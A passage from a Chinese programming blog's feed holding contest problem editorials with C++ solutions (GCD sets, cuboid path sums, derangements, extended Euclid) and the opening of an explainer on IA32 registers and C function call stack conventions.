Funny</a></h3><p>题意：<br>在黑板上写有$n$个数，每次删掉$a,b,c$三个数并把$d$写两遍，$d$可以是$(a,b),(a,c),(b,c)$。在$n-2$次操作后会留下两个相同的数，输出这个数的所有可能情况。</p><p>题解：<br>这个题很难<del>虽然出在某一场BC的A题</del>。<br>首先要思考一下脱离具体过程，这个数到底是什么。题中的过程以下简称为“擦黑板”。</p><ol><li>如果已经存在两个相同的数$x$，再取一个数$y$进行一次擦黑板，那么可以令$d=(x,x)=x$，剩下的数为$x,x$。可以发现$y$没有产生影响，两个$x$直接“吃掉”了$y$；</li><li>由1，我们可以单独考虑每一个$size\ge 3$的子集，它的结果一定是两个相同的数，其他的数直接吃掉就好。为了保证枚举的不重不漏，该子集内应该有尽量多的数参与$gcd$运算（注意，参与擦黑板$\neq$参与$gcd$运算），也就是$size-1$个数。因为第一次擦黑板一定有一个数无法参与$gcd$运算，而从第二次开始，有前一次得到的两个数$x$，再取一个数$y$进行一次擦黑板，那么可以令$d=(x,y)$，$y$一定能参与$gcd$运算。</li></ol><p>综上，最后留在黑板上的数其实是任意一个$2\le size \le n-1$的子集的所有数的$gcd$。</p><p>接着再思考一下怎么巧妙地求出这些数，因为暴力枚举子集肯定是不行的。<br>首先注意到$a_i$的值域只有$1000$，而且$gcd$运算只会变小，所以这实际上也是答案的值域。<br>其次$gcd$有一个更强的性质，两个不一样的数取$gcd$，最大也只能是大数的一半。（为什么？）<br>所以我们写一个比较暴力的方法也能保证复杂度，最后要注意的一点就是不要取到全集，具体可以看代码。<br>复杂度$O(n^2+nV\cdot min(log(V),n-3))$，$V$为$a_i$的值域。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">1000</span>;</div><div class="line"><span class="keyword">int</span> a[<span class="number">510</span>];</div><div class="line"><span class="keyword">bool</span> b[MAX+<span class="number">5</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++) &#123;</div><div class="line">                b[__gcd(a[i],a[j])]=<span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> num=<span class="number">2</span>;</div><div class="line">        <span class="keyword">bool</span> flag=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">while</span> (++num&lt;n &amp;&amp; flag) &#123;</div><div class="line">            flag=<span class="literal">false</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=MAX;i++) &#123;</div><div class="line">                <span class="keyword">if</span> (b[i]) &#123;</div><div class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</div><div class="line">                        <span class="keyword">int</span> y=__gcd(i,a[j]);</div><div class="line">                        <span class="keyword">if</span> (!b[y]) &#123;</div><div class="line">                            b[y]=<span class="literal">true</span>;</div><div class="line">                            flag=<span class="literal">true</span>;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">bool</span> fi=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (b[i]) &#123;</div><div class="line">                <span class="keyword">if</span> (fi) &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</div><div class="line">                    fi=<span class="literal">false</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">" %d"</span>,i);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="D-Ant"><a href="#D-Ant" class="headerlink" title="D - Ant"></a><a href="https://vjudge.net/problem/ZOJ-3903" target="_blank" rel="noopener">D - Ant</a></h3><p>题意：蚂蚁在一个长方体表面从起点爬到对角点的最短长度设为$L$，问所有最长边是$n$的长方体的$L^2$之和。<br>题解：出这题主要是想让大家牢记三个求和公式。<br>$$ \sum_{i=1}^{n}{i} = \frac{n(n+1)}{2} \\<br> \sum_{i=1}^{n}{i^2} = \frac{n(n+1)(2n+1)}{6} \\<br> \sum_{i=1}^{n}{i^3} = (\sum_{i=1}^{n}{i})^2 = \frac{n^2(n+1)^2}{4} $$<br>在表面上的路径实际上就是三种展开，所以$L^2=\min\{(x+y)^2+n^2,(n+x)^2+y^2,(n+y)^2+x^2\}$，因为在这个式子中$x+y+n$为定值，那么自然是两个数越接近越小，又有$x,y\le n$，所以$L^2=(x+y)^2+n^2$。<br>$$\begin{equation}\begin{split}<br>Ans &amp;= \sum_{x=1}^{n}{\sum_{y=1}^{x}{(x+y)^2+n^2}} \\<br> &amp;= \sum_{x=1}^{n}{x^3+n^2x+x^2(x+1)+\frac{x(x+1)(2x+1)}{6}} \\<br> &amp;= \sum_{x=1}^{n}{\frac{7}{3}x^3+\frac{3}{2}x^2+(\frac{1}{6}+n^2)x} \\<br> &amp;= \frac{7}{3}\frac{n^2(n+1)^2}{4}+\frac{3}{2}\frac{n(n+1)(2n+1)}{6}+(\frac{1}{6}+n^2)\frac{n(n+1)}{2} \\<br> &amp;= \frac{1}{12}(13n^4+26n^3+17n^2+4n)<br>\end{split}\end{equation}$$<br>然后就是求个逆元乘一乘模一模就行了。<br>复杂度$O(1)$。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">using</span> ll = <span class="keyword">long</span> <span class="keyword">long</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">1000000007</span>;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">fpow</span><span class="params">(ll x,ll n)</span></span></div><div class="line">&#123;</div><div class="line">    ll res=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (;n;n&gt;&gt;=<span class="number">1</span>,x=x*x%MO) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) res=res*x%MO;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ll INV12=fpow(<span class="number">12</span>,MO<span class="number">-2</span>);</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        ll n;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;n);</div><div class="line">        n%=MO;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,n*(<span class="number">4</span>+n*(<span class="number">17</span>+n*(<span class="number">26</span>+n*<span class="number">13</span>%MO)%MO)%MO)%MO*INV12%MO);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="E-RPG的错排"><a href="#E-RPG的错排" class="headerlink" title="E - RPG的错排"></a><a href="https://vjudge.net/problem/HDU-2068" target="_blank" rel="noopener">E - RPG的错排</a></h3><p>首先预处理错排数和组合数，然后枚举一下猜错了多少人。<br>单组复杂度$O(n)$。<br>错排数的通项和递推式请参阅其他资料。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">26</span>;</div><div class="line">ll cp[N],C[N][N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    cp[<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;N/<span class="number">2</span>;i++) &#123;</div><div class="line">        cp[i]=(cp[i<span class="number">-2</span>]+cp[i<span class="number">-1</span>])*(i<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++) &#123;</div><div class="line">        C[i][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</div><div class="line">            C[i][j]=C[i<span class="number">-1</span>][j<span class="number">-1</span>]+C[i<span class="number">-1</span>][j];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF&amp;&amp;n) &#123;</div><div class="line">        ll ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n/<span class="number">2</span>;i++) &#123;</div><div class="line">            ans+=C[n][i]*cp[i];</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="F-Dertouzos"><a href="#F-Dertouzos" class="headerlink" title="F - Dertouzos"></a><a href="https://vjudge.net/problem/HDU-5750" target="_blank" rel="noopener">F - Dertouzos</a></h3><p>题意：$n$的真因子是不为$n$的因子。给出$n$和$d$，问有多少小于$n$的数的最大真因子是$d$。<br>题解：即$pd=m\lt n$，显然有</p><ol><li>$p \le \frac{n-1}{d}$；</li><li>$p$必须为质数；(如若不然，则$p$有真因子$q$，$qd$是比$d$更大的$m$的真因子。)</li><li>$p \le c$，其中$c$为$d$的最小质因子。(如若不然，则$\frac{d}{c}\times p$是比$d$更大的$m$的真因子。)</li></ol><p>由2，我们先做一遍筛法以及前缀和。再算出1的界，最后用筛出来的质数去算3的界。</p><p>注意点：用筛出来的质数去算3的界会有$O(\sqrt{d})$的复杂度，当$d$一直很大($\approx 10^{9}$)时会超时，而此时1的界必然比较小，应该<strong>在超过已有的界时及时退出</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> tot=<span class="number">0</span>,prime[<span class="number">100000</span>];</div><div class="line"><span class="keyword">bool</span> isprime[MAX];</div><div class="line"><span class="keyword">int</span> sum[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">memset</span>(isprime,<span class="number">1</span>,<span class="keyword">sizeof</span>(isprime));</div><div class="line">    isprime[<span class="number">1</span>]=<span class="literal">false</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;MAX; i++) &#123;</div><div class="line">        <span class="keyword">if</span>(isprime[i])prime[++tot]=i;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=tot&amp;&amp;i*prime[j]&lt;MAX; j++) &#123;</div><div class="line">            isprime[i*prime[j]]=<span class="literal">false</span>;</div><div class="line">            <span class="keyword">if</span>(i%prime[j]==<span class="number">0</span>)<span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;MAX;i++) &#123;</div><div class="line">        sum[i]=sum[i<span class="number">-1</span>]+isprime[i];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> T,n,d;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmaxp</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (prime[i]&gt;(n<span class="number">-1</span>)/d) <span class="keyword">return</span> prime[i<span class="number">-1</span>];</div><div class="line">        <span class="keyword">if</span> (d%prime[i]==<span class="number">0</span>) <span class="keyword">return</span> prime[i];</div><div class="line">        <span class="keyword">if</span> (prime[i]*prime[i]&gt;d) <span class="keyword">return</span> min(d,(n<span class="number">-1</span>)/d);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    init();</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;d);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum[getmaxp()]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><em>ps.</em> 其实有一个更显然的做法，直接依次枚举质数即可。</p><h3 id="G-One-Person-Game"><a href="#G-One-Person-Game" class="headerlink" title="G - One Person Game"></a><a href="https://vjudge.net/problem/ZOJ-3593" target="_blank" rel="noopener">G - One Person Game</a></h3><p>抽象一下，有方程$ax+by+cz=B-A$成立，其中$c=a+b$，求$|x|+|y|+|z|$的最小值。<br>有个结论不太会证，简单来说，$x,y,z$均不为$0$时不会比有一个为$0$时更好。（把$a+b$变成$c$或者把$c$拆掉）<br>那么其实就是求满足$ax+by=C$的$|x|+|y|$的最小值，然后修改系数求三遍比较一下。<br>当$x,y$异号时，显然是让$x,y$都尽量接近0；当$x,y$同号时，因为系数都是正的，其实也是在$x$最接近$0$或者$y$最接近$0$的时候取到极值。<br>综上，我们只要分别考虑$x$最接近$0$和$y$最接近$0$的情况，各有两个。又因为C/C++的整除符号在被除数是负数时不是向下取整，我们可以更暴力地每次考虑三种情况。<br>复杂度$O(logV)$，$V$为$a,b$的值域大小。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">using</span> ll = <span class="keyword">long</span> <span class="keyword">long</span>;</div><div class="line"><span class="keyword">const</span> ll INF=<span class="number">1L</span>L&lt;&lt;<span class="number">60</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">extend_gcd</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a,<span class="keyword">long</span> <span class="keyword">long</span> b,<span class="keyword">long</span> <span class="keyword">long</span> &amp;x,<span class="keyword">long</span> <span class="keyword">long</span> &amp;y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>&amp;&amp;b==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//无最大公约数</span></div><div class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>) &#123;</div><div class="line">        x=<span class="number">1</span>;</div><div class="line">        y=<span class="number">0</span>;</div><div class="line">        <span class="keyword">return</span> a;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> d=extend_gcd(b,a%b,y,x);</div><div class="line">    y-=a/b*x;</div><div class="line">    <span class="keyword">return</span> d;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">calc</span><span class="params">(ll x,ll y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(x)+<span class="built_in">abs</span>(y);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">solve</span><span class="params">(ll a,ll b,ll c)</span></span></div><div class="line">&#123;</div><div class="line">    ll x,y,t;</div><div class="line">    ll g=extend_gcd(a,b,x,y);</div><div class="line">    <span class="keyword">if</span> (c%g) <span class="keyword">return</span> INF;</div><div class="line">    a/=g;b/=g;c/=g;</div><div class="line">    x*=c;y*=c;</div><div class="line">    t=x/b;x-=b*t;y+=a*t;</div><div class="line">    ll res=calc(x,y);</div><div class="line">    res=min(res,calc(x-b,y+a));</div><div class="line">    res=min(res,calc(x+b,y-a));</div><div class="line">    t=y/a;x+=b*t;y-=a*t;</div><div class="line">    res=min(res,calc(x,y));</div><div class="line">    res=min(res,calc(x+b,y-a));</div><div class="line">    res=min(res,calc(x-b,y+a));</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        ll A,B,a,b;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld%lld%lld%lld"</span>,&amp;A,&amp;B,&amp;a,&amp;b);</div><div class="line">        ll ans=solve(a,b,B-A);</div><div class="line">        ans=min(ans,solve(a,a+b,B-A));</div><div class="line">        ans=min(ans,solve(b,a+b,B-A));</div><div class="line">        <span class="keyword">if</span> (ans==INF) <span class="built_in">puts</span>(<span class="string">"-1"</span>);</div><div class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;A-求递推序列的第N项&quot;&gt;&lt;a href=&quot;#A-求递推序列的第N项&quot; class=&quot;headerlink&quot; title=&quot;A - 求递推序列的第N项&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://vjudge.net/problem/51Nod-1126&quot; tar
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>C语言函数调用栈（一）</title>
    <link href="https://www.smlight.xyz/2018/07/19/c-stack-frame/"/>
    <id>https://www.smlight.xyz/2018/07/19/c-stack-frame/</id>
    <published>2018-07-19T14:16:25.000Z</published>
    <updated>2019-04-19T08:24:18.848Z</updated>
    
    <content type="html"><![CDATA[<p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。</p><p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p><h3 id="1-寄存器分配"><a href="#1-寄存器分配" class="headerlink" title="1 寄存器分配"></a>1 寄存器分配</h3><p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：<center><br><img src="/blog/images/271639137915732.jpg" alt="图1 IA32处理器寄存器"><br></center></p><p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器，如一些特殊的算术操作指令imull/mull/cltd/idivl/divl要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax (lower32-bit)中；又如函数返回值通常保存在%eax中，等等。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义(如图中所示)。</p><p>对于寄存器%eax、%ebx、%ecx和%edx，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</p><p>在x86处理器中，EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p><p>注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p><p>不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位。</p><p>编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。</p><blockquote><p>   【扩展阅读】栈帧指针寄存器<br>    为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。<br>    因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。<br>    在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。</p></blockquote><h3 id="2-寄存器使用约定"><a href="#2-寄存器使用约定" class="headerlink" title="2 寄存器使用约定"></a>2 寄存器使用约定</h3><p>程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。</p><p>根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p><p>当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p><h3 id="3-栈帧结构"><a href="#3-栈帧结构" class="headerlink" 